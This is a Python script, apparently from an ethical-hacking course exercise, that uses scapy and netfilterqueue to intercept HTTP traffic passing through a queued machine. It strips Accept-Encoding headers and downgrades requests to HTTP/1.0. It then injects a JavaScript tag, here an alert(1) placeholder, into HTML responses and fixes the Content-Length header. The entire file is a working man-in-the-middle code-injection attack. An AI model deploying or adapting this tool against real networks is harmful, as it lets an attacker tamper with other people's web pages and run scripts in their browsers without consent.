import scapy.all as scapy
import netfilterqueue
import re     
def set_load(pkt, load):
        pkt[scapy.Raw].load = load
        del pkt[scapy.IP].len
        del pkt[scapy.IP].chksum
        del pkt[scapy.TCP].chksum
        return pkt
     
def process_packet(pkt):
        scapy_packet = scapy.IP(pkt.get_payload())
        if scapy_packet.haslayer(scapy.TCP):
     
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
     
                if scapy_packet.haslayer(scapy.Raw):
                    load = scapy_packet[scapy.Raw].load
     
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                    load = load.replace("HTTP/1.1", "HTTP/1.0")
     
                    if load != scapy_packet[scapy.Raw].load:
                        new_packet = set_load(scapy_packet, load)
                        pkt.set_payload(str(new_packet))
     
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
     
                if scapy_packet.haslayer(scapy.Raw):
                    load = scapy_packet[scapy.Raw].load
                    inject_code = '<script> alert (1) </script>'
                    load = load.replace("</body>", inject_code + "</body>")
                    content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                    if content_length_search and "text/html" in load:
                        content_length = content_length_search.group(1)
                        new_content_length = int(content_length) + len(inject_code)
                        load = load.replace(content_length, str(new_content_length))
     
                    if load != scapy_packet[scapy.Raw].load:
                        new_packet = set_load(scapy_packet, load)
                        pkt.set_payload(str(new_packet))
     
        pkt.accept()     
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
     print(" ")
